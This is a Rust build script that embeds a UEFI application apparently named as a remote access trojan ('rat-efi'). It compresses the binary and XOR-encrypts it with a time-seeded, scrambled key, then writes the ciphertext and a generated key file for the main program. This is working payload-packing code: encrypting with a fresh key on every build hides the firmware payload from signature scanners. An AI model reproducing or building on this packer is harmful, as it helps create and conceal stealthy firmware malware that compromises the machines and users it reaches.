use std::io::Write;
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};
use std::{env, fs};

#[cfg(debug_assertions)]
pub const EFI_APPLICATION: &[u8] =
    include_bytes!("../rat-efi/target/x86_64-unknown-uefi/debug/rat-efi.efi");

#[cfg(not(debug_assertions))]
pub const EFI_APPLICATION: &[u8] =
    include_bytes!("../rat-efi/target/x86_64-unknown-uefi/release/rat-efi.efi");

fn shuffle_key(seed: &mut [u8]) {
    assert!(!seed.is_empty());

    if seed.iter().all(|&b| b == 0) {
        seed[0] = 1;
    }

    let mut common = 0;
    for e in seed.iter() {
        common ^= e;
    }

    let len = seed.len();
    for i in 0..len {
        let mut a = seed[i].wrapping_add(10);
        let mut b = seed[(i + 1) % len].wrapping_add(20);
        let mut c = seed[(i + 3) % len].wrapping_add(30);

        common ^= a ^ b ^ c;

        let d = common.wrapping_mul(u8::try_from(i & usize::from(u8::MAX)).unwrap());

        a = a.wrapping_add(d);
        b = b.wrapping_add(d);
        c = c.wrapping_add(d);

        seed[i] ^= b.rotate_left(3);
        seed[i] ^= c.rotate_right(5);
        seed[i] = seed[i].wrapping_add(a.rotate_left(1));
    }
}

fn main() {
    let env_out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let embedded_file = env_out_dir.join("embedded.efi");

    let mut compressed = vec![];
    let mut compressor = zstd::Encoder::new(&mut compressed, 22).unwrap();
    compressor.write_all(EFI_APPLICATION).unwrap();
    compressor.finish().unwrap();

    let mut key = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos()
        .to_le_bytes();
    shuffle_key(&mut key);

    let mut encrypted = Vec::with_capacity(compressed.len());
    for (i, m) in compressed.iter().enumerate() {
        encrypted.push(m ^ key[i % key.len()]);
    }

    let mut file = fs::File::create(&embedded_file).unwrap();
    file.write_all(&encrypted).unwrap();

    let key_file = env_out_dir.join("key.rs");
    let mut file = fs::File::create(&key_file).unwrap();
    file.write_all(b"pub const EFI_APPLICATION_KEY: &[u8] = &")
        .unwrap();
    file.write_all(format!("{:?};", key).as_bytes()).unwrap();
}
